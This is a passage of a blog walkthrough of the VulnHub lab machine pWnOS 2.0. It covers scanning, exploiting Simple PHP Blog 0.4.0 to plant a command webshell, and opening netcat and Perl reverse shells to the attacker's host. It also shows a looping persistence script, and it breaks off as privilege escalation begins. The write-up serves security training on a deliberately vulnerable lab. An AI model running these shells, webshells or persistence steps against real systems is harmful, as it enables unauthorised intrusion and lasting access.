---
layout: post
title:  "pWnOS: 2.0 (Pre-Release)"
date:   2019-04-15 00:34:01 +0000
author: Larry Brown
category: Walkthroughs
tags: [vulnhub]
---
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/><meta content="Evernote Mac 7.10 (457750)" name="exporter-version"/><meta content="Larry Brown" name="author"/><meta content="2019-04-15 00:34:01 +0000" name="created"/><meta content="desktop.mac" name="source"/><meta content="2019-04-29 16:57:09 +0000" name="updated"/><title>pWnOS: 2.0 (Pre-Release)</title></head><body><div>VulnHub URL: <a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/" target="_blank">https://www.vulnhub.com/entry/pwnos-20-pre-release,34/</a></div><div>Hostname: web</div><div>IP Address: 10.10.10.100 (static)</div><div><br/></div><div><br/></div><div><h2>Information Gathering/Recon</h2></div><div><br/></div><div>The IP address is set statically to 10.10.10.100. I had to add an IP address to my attacking machine (Kali VM) to be able to reach it.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>ip address add 10.10.10.101/24 dev eth0</div></div><div><br/></div><div>And on my Mac...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>sudo ifconfig en0 alias 10.10.10.102/24 up</div></div><div><br/></div><div><br/></div><div><h2>Service Enumeration/Scanning</h2></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pwnosv2# nmap -Pn -sT -sV -sC -A -oA pwnosv2 -p 1-65535 10.10.10.100</div><div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-25 15:38 EDT</div><div>Nmap scan report for 10.10.10.100</div><div>Host is up (0.0029s latency).</div><div>Not shown: 65533 closed ports</div><div>PORT   STATE SERVICE VERSION</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp open  ssh     </font><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSH 5.8p1</font><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;"> Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)</font></div><div>| ssh-hostkey: </div><div>|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)</div><div>|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)</div><div>|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp open  http    </font><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache httpd 2.2.17</font><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;"> ((Ubuntu))</font></div><div>| http-cookie-flags: </div><div>|   /: </div><div>|     PHPSESSID: </div><div>|_      httponly flag not set</div><div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.17</font> (Ubuntu)</div><div>|_http-title: Welcome to this Site!</div><div>MAC Address: 00:50:56:21:18:BC (VMware)</div><div>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</div><div>TCP/IP fingerprint:</div><div>OS:SCAN(V=7.70%E=4%D=4/25%OT=22%CT=1%CU=33297%PV=Y%DS=1%DC=D%G=Y%M=005056%T</div><div>OS:M=5CC20CDB%P=x86_64-pc-linux-gnu)SEQ(SP=C7%GCD=1%ISR=CF%TI=Z%CI=Z%II=I%T</div><div>OS:S=7)OPS(O1=M5B4ST11NW5%O2=M5B4ST11NW5%O3=M5B4NNT11NW5%O4=M5B4ST11NW5%O5=</div><div>OS:M5B4ST11NW5%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3</div><div>OS:890)ECN(R=Y%DF=Y%T=40%W=3908%O=M5B4NNSNW5%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A</div><div>OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%</div><div>OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=</div><div>OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=</div><div>OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%</div><div>OS:T=40%CD=S)</div><div><div><br/></div></div><div>Network Distance: 1 hop</div><div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div><div><div><br/></div></div><div>TRACEROUTE</div><div>HOP RTT     ADDRESS</div><div>1   2.91 ms 10.10.10.100</div><div><div><br/></div></div><div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div>Nmap done: 1 IP address (1 host up) scanned in 26.86 seconds</div></div><div><br/></div><!--more--><div><br/></div><div><h2>Gaining Access</h2></div><div><br/></div><div>The server only has two open ports, so we'll start with the HTTP service on TCP port 80. Before actually browsing to it, we'll scan it with nikto.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pwnosv2# nikto -h http://10.10.10.100</div><div>- Nikto v2.1.6</div><div>---------------------------------------------------------------------------</div><div>+ Target IP:          10.10.10.100</div><div>+ Target Hostname:    10.10.10.100</div><div>+ Target Port:        80</div><div>+ Start Time:         2019-04-25 15:41:48 (GMT-4)</div><div>---------------------------------------------------------------------------</div><div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.17</font> (Ubuntu)</div><div>+ Retrieved x-powered-by header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">PHP/5.3.5-1ubuntu7</font></div><div>+ The anti-clickjacking X-Frame-Options header is not present.</div><div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div><div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div><div>+ Cookie PHPSESSID created without the httponly flag</div><div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.17</font> appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div><div>+ <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">Uncommon header 'tcn' found, with contents: list</font></div><div>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php</div><div>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</div><div>+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</div><div>+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</div><div>+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</div><div>+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</div><div>+ <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">OSVDB-3268: /includes/: Directory indexing found.</font></div><div>+ OSVDB-3092: /includes/: This might be interesting...</div><div>+ /info/: Output from the phpinfo() function was found.</div><div>+ OSVDB-3092: /info/: This might be interesting...</div><div>+ OSVDB-3092: /login/: This might be interesting...</div><div>+ OSVDB-3092: /register/: This might be interesting...</div><div>+ <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">/info.php: Output from the phpinfo() function was found.</font></div><div>+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.</div><div>+ OSVDB-3268: /icons/: Directory indexing found.</div><div>+ Server may leak inodes via ETags, header found with file /icons/README, inode: 1311031, size: 5108, mtime: Tue Aug 28 06:48:10 2007</div><div>+ OSVDB-3233: /icons/README: Apache default file found.</div><div>+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/</div><div>+ <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">/login.php: Admin login page/section found.</font></div><div>+ 8673 requests: 0 error(s) and 26 item(s) reported on remote host</div><div>+ End Time:           2019-04-25 15:42:41 (GMT-4) (53 seconds)</div><div>---------------------------------------------------------------------------</div><div>+ 1 host(s) tested</div></div><div><br/></div><div>Nikto found some additional software versions as well as lots of indications of a poorly configured web server. Initial scans have revealed the following software in use.</div><div><br/></div><ul><li><div>Apache/2.2.17 - a potential Integer Overflow issue</div></li><li><div>PHP/5.3.5-1ubuntu7 - mostly DoS issues</div></li><li><div>OpenSSH 5.8p1 - potential command execution (sftp), username enumeration</div></li></ul><div><br/></div><div>No homeruns with the software we know about so far. Let's start digging into some of the web content we know is out there.</div><div><br/></div><div>The site claims to be an "internal website" for IsIntS.</div><div><br/></div><div><img height="150" src="/assets/images/2019-04-15-pwnos-2.0-pre-release/0FC33389-9952-4F60-84EE-DDB89238DC26.png" width="365"/><br/></div><div><br/></div><div>There are links to...</div><div><br/></div><div><img height="64" src="/assets/images/2019-04-15-pwnos-2.0-pre-release/18C7D837-60D2-4597-AAB1-D36482A9DC62.png" width="66"/><br/></div><div><br/></div><div>The /info.php page returns phpinfo() data including typical 'uname -a' output.</div><div><br/></div><div><img height="42" src="/assets/images/2019-04-15-pwnos-2.0-pre-release/5A40FEA6-F0DC-4263-9160-C25B2867A661.png" width="607"/><br/></div><div><br/></div><div>Checking out the /includes directory nikto told us about, we see this in the footer.html page.</div><div><br/></div><div><img height="163" src="/assets/images/2019-04-15-pwnos-2.0-pre-release/CBDEEDE9-C694-4CF9-87DD-A66E4D3D330D.png" width="642"/><br/></div><div><br/></div><div>Good to know what qualifies a user as an "administrator".</div><div><br/></div><div>Before going forward with looking into sql injection issues with the login and registration forms, I'm going to run dirb to make sure there aren't any other directories that might contain helpful information.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pwnosv2# dirb http://10.10.10.100 /usr/share/dirb/wordlists/big.txt -o dirb-http-10.10.10.100.txt</div><div><div><br/></div></div><div>-----------------</div><div>DIRB v2.22    </div><div>By The Dark Raver</div><div>-----------------</div><div><div><br/></div></div><div>OUTPUT_FILE: dirb-http-10.10.10.100.txt</div><div>START_TIME: Thu Apr 25 16:19:19 2019</div><div>URL_BASE: http://10.10.10.100/</div><div>WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt</div><div><div><br/></div></div><div>-----------------</div><div><div><br/></div></div><div>GENERATED WORDS: 20458</div><div><div><br/></div></div><div>---- Scanning URL: http://10.10.10.100/ ----</div><div>+ http://10.10.10.100/activate (CODE:302|SIZE:0)</div><div>==&gt; DIRECTORY: http://10.10.10.100/blog/</div><div>+ http://10.10.10.100/cgi-bin/ (CODE:403|SIZE:288)</div><div>==&gt; DIRECTORY: http://10.10.10.100/includes/</div><div>+ http://10.10.10.100/index (CODE:200|SIZE:854)</div><div>+ http://10.10.10.100/info (CODE:200|SIZE:50175)</div><div>+ http://10.10.10.100/login (CODE:200|SIZE:1174)</div><div>+ http://10.10.10.100/register (CODE:200|SIZE:1562)</div><div>+ http://10.10.10.100/server-status (CODE:403|SIZE:293)</div><div><div><br/></div></div><div>---- Entering directory: http://10.10.10.100/blog/ ----</div><div>+ http://10.10.10.100/blog/add (CODE:302|SIZE:0)</div><div>+ http://10.10.10.100/blog/atom (CODE:200|SIZE:1062)</div><div>+ http://10.10.10.100/blog/categories (CODE:302|SIZE:0)</div><div>+ http://10.10.10.100/blog/colors (CODE:302|SIZE:0)</div><div>+ http://10.10.10.100/blog/comments (CODE:302|SIZE:0)</div><div>==&gt; DIRECTORY: http://10.10.10.100/blog/config/</div><div>+ http://10.10.10.100/blog/contact (CODE:200|SIZE:5886)</div><div>==&gt; DIRECTORY: http://10.10.10.100/blog/content/</div><div>+ http://10.10.10.100/blog/delete (CODE:302|SIZE:0)</div><div>==&gt; DIRECTORY: http://10.10.10.100/blog/docs/</div><div>==&gt; DIRECTORY: http://10.10.10.100/blog/flash/</div><div>==&gt; DIRECTORY: http://10.10.10.100/blog/images/</div><div>+ http://10.10.10.100/blog/index (CODE:200|SIZE:8094)</div><div>+ http://10.10.10.100/blog/info (CODE:302|SIZE:0)</div><div>==&gt; DIRECTORY: http://10.10.10.100/blog/interface/</div><div>==&gt; DIRECTORY: http://10.10.10.100/blog/languages/</div><div>+ http://10.10.10.100/blog/login (CODE:200|SIZE:5635)</div><div>+ http://10.10.10.100/blog/logout (CODE:302|SIZE:0)</div><div>+ http://10.10.10.100/blog/options (CODE:302|SIZE:0)</div><div>+ http://10.10.10.100/blog/rdf (CODE:200|SIZE:1411)</div><div>+ http://10.10.10.100/blog/rss (CODE:200|SIZE:1237)</div><div>==&gt; DIRECTORY: http://10.10.10.100/blog/scripts/</div><div>+ http://10.10.10.100/blog/search (CODE:200|SIZE:4919)</div><div>+ http://10.10.10.100/blog/setup (CODE:302|SIZE:0)</div><div>+ http://10.10.10.100/blog/static (CODE:302|SIZE:0)</div><div>+ http://10.10.10.100/blog/stats (CODE:200|SIZE:5277)</div><div>==&gt; DIRECTORY: http://10.10.10.100/blog/themes/</div><div>+ http://10.10.10.100/blog/trackback (CODE:302|SIZE:0)</div><div>+ http://10.10.10.100/blog/upgrade (CODE:302|SIZE:0)</div><div>+ http://10.10.10.100/blog/upload_img (CODE:302|SIZE:0)</div><div><div><br/></div></div><div>---- Entering directory: http://10.10.10.100/includes/ ----</div><div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div><div>    (Use mode '-w' if you want to scan it anyway)</div><div><div><br/></div></div><div>---- Entering directory: http://10.10.10.100/blog/config/ ----</div><div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div><div>    (Use mode '-w' if you want to scan it anyway)</div><div><div><br/></div></div><div>---- Entering directory: http://10.10.10.100/blog/content/ ----</div><div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div><div>    (Use mode '-w' if you want to scan it anyway)</div><div><div><br/></div></div><div>---- Entering directory: http://10.10.10.100/blog/docs/ ----</div><div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div><div>    (Use mode '-w' if you want to scan it anyway)</div><div><div><br/></div></div><div>---- Entering directory: http://10.10.10.100/blog/flash/ ----</div><div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div><div>    (Use mode '-w' if you want to scan it anyway)</div><div><div><br/></div></div><div>---- Entering directory: http://10.10.10.100/blog/images/ ----</div><div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div><div>    (Use mode '-w' if you want to scan it anyway)</div><div><div><br/></div></div><div>---- Entering directory: http://10.10.10.100/blog/interface/ ----</div><div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div><div>    (Use mode '-w' if you want to scan it anyway)</div><div><div><br/></div></div><div>---- Entering directory: http://10.10.10.100/blog/languages/ ----</div><div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div><div>    (Use mode '-w' if you want to scan it anyway)</div><div><div><br/></div></div><div>---- Entering directory: http://10.10.10.100/blog/scripts/ ----</div><div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div><div>    (Use mode '-w' if you want to scan it anyway)</div><div><div><br/></div></div><div>---- Entering directory: http://10.10.10.100/blog/themes/ ----</div><div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div><div>    (Use mode '-w' if you want to scan it anyway)</div><div><div><br/></div></div><div>-----------------</div><div>END_TIME: Thu Apr 25 16:22:57 2019</div><div>DOWNLOADED: 40916 - FOUND: 28</div></div><div><br/></div><div>Checking out the /blog found by dirb, we see from the links in the bottom right menu that it is using Simple PHP Blog 0.4.0.</div><div><br/></div><div><img height="126" src="/assets/images/2019-04-15-pwnos-2.0-pre-release/C2403687-8E9F-4EA1-8F04-7A3C5D918B7C.png" width="225"/><br/></div><div><br/></div><div>This version of Simple PHP Blog has known vulnerabilities (including a Metasploit module).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Simple PHP Blog 0.4.0 - Multiple Remote s                                                                                      | exploits/php/webapps/1191.pl</div><div>Simple PHP Blog 0.4.0 - Remote Command Execution (Metasploit)                                                                  | exploits/php/webapps/16883.rb</div></div><div><br/></div><div>Using the 1191.pl exploit proof-of-concept, we chose option 1, "Upload cmd.php in [site]/images/".</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pwnosv2# perl 1191.pl -h http://10.10.10.100/blog -e 1</div><div><div><br/></div></div><div>________________________________________________________________________________</div><div>                  SimplePHPBlog v0.4.0 Exploits</div><div>                             by</div><div>                     Kenneth F. Belva, CISSP</div><div>                    http://www.ftusecurity.com</div><div>________________________________________________________________________________</div><div>Running cmd.php Upload Exploit....</div><div><div><br/></div></div><div>Retrieved Username and Password Hash: $1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/</div><div>Deleted File: ./config/password.txt</div><div>./config/password.txt created!</div><div>Username is set to: a</div><div>Password is set to: a</div><div>Logged into SimplePHPBlog at: http://10.10.10.100/blog/login_cgi.php</div><div>Current Username 'a' and Password 'a'...</div><div>Created cmd.php on your local machine.</div><div>Created reset.php on your local machine.</div><div>Created cmd.php on target host: http://10.10.10.100/blog</div><div>Created reset.php on target host: http://10.10.10.100/blog</div><div>Removed cmd.php from your local machine.</div><div>Failed to POST 'http://10.10.10.100/blog/images/reset.php': 500 Internal Server Error at 1191.pl line 418.</div><div>Removed reset.php from your local machine.</div></div><div><br/></div><div>We got an error, but when we checked the /blog/images directory, we had a cmd.php file. We confirmed the file would accept a cmd parameter and run it locally. We then started our Metasploit listener...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div><div>payload =&gt; generic/shell_reverse_tcp</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.10.10.101</div><div>LHOST =&gt; 10.10.10.101</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div><div>LPORT =&gt; 5432</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 1.</div><div>[*] Exploit completed, but no session was created.</div><div><div><br/></div></div><div>[*] Started reverse TCP handler on 10.10.10.101:5432</div></div><div><br/></div><div>Many times the netcat command doesn't allow the -e option, we will send the following command (URL encoded).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.101 5432 &gt;/tmp/f</div></div><div><br/></div><div>Which looks like this...</div><div><br/></div><div><a href="http://10.10.10.100/blog/images/cmd.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.10.101%205432%20%3E%2Ftmp%2Ff">http://10.10.10.100/blog/images/cmd.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.10.101%205432%20%3E%2Ftmp%2Ff</a></div><div><br/></div><div>When running our command, we got a session! 😄</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.10.10.101:5432 -&gt; 10.10.10.100:35627) at 2019-04-25 16:50:13 -0400</div><div>msf5 exploit(multi/handler) &gt; sessions 1</div><div>[*] Starting interaction with 1...</div><div><div><br/></div></div><div>$ pwd</div><div>/var/www/blog/images</div><div>$ id</div><div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div></div><div><br/></div><div>Right after we connected, we went ahead and started a second listener and spawned a second shell using the following perl command.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>perl -e 'use Socket;$i="10.10.10.101";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div></div><div><br/></div><div><br/></div><div><h2>Maintaining Access</h2></div><div><br/></div><div>Since the host has an SSH service available, we want to check and see if we can set up SSH keys and login via SSH.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>$ grep `whoami` /etc/passwd</div><div>www-data:x:33:33:www-data:/var/www:/bin/sh</div></div><div><br/></div><div>Our user has a shell defined... but we don't have permissions to write to our home directory (/var/www).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>drwxr-xr-x  4 root root  4096 May  9  2011 www</div></div><div><br/></div><div>We won't be able to set up SSH keys for this account, so I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes and use python's SimpleHTTPServer to serve it up to the victim.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pwnosv2# cat thumbs </div><div>#!/bin/sh</div><div>while true; do</div><div>    perl -e 'use Socket;$i="10.10.10.101";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div><div>    # sleep for 300 seconds (5 mins)</div><div>    sleep 300</div><div>done</div><div>root@kali:~/Walkthroughs/pwnosv2# python -m SimpleHTTPServer 4321                                                                                                          Serving HTTP on 0.0.0.0 port 4321 ...</div><div>10.10.10.100 - - [25/Apr/2019 17:05:49] "GET /thumbs HTTP/1.0" 200 -</div></div><div><br/></div><div>I downloaded the script to the victim's /var/www/blog/images directory and ran it in the background. Now, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>$ wget -O thumbs 10.10.10.101:4321/thumbs</div><div>--2019-03-01 00:20:54--  http://10.10.10.101:4321/thumbs</div><div>Connecting to 10.10.10.101:4321... connected.</div><div>HTTP request sent, awaiting response... 200 OK</div><div>Length: 307 [application/octet-stream]</div><div>Saving to: `thumbs'</div><div><div><br/></div></div><div>     0K                                                       100% 26.1M=0s</div><div><div><br/></div></div><div>2019-03-01 00:20:54 (26.1 MB/s) - `thumbs' saved [307/307]</div><div><div><br/></div></div><div>$ chmod +x thumbs</div><div>$ ./thumbs &amp;</div></div><div><br/></div><div><br/></div><div><h2>Privilege Escalation</h2></div><div><br/></div><div>Well, getting on to the box was easy enough. Let's see what it's going to take to get root.</div><div><br/></div><div>We already know the kernel information from the /info.php file.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@web:/var$ uname -a</div><div>Linux web 2.6.38-8-server #42-Ubuntu SMP Mon Apr 11 03:49:04 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux</div></div><div><br/></div><div>We also check /etc/issue and /etc/issue.net for the additional info.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@web:/etc$ cat issue*</div><div>Ubuntu 11.04 \n \l</div><div><div><br/></div></div><div>Ubuntu 11.04</div></div><div><br/></div><div>Checking the exploit database, we having the following potential vulnerability for our version of Ubuntu.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>FTP Client (Ubuntu 11.04) - Local Buffer Overflow Crash (PoC)                                                                  | exploits/linux/dos/17806.txt</div></div><div><br/></div><div>This is classified as DoS, so we'll keep looking for a better path to 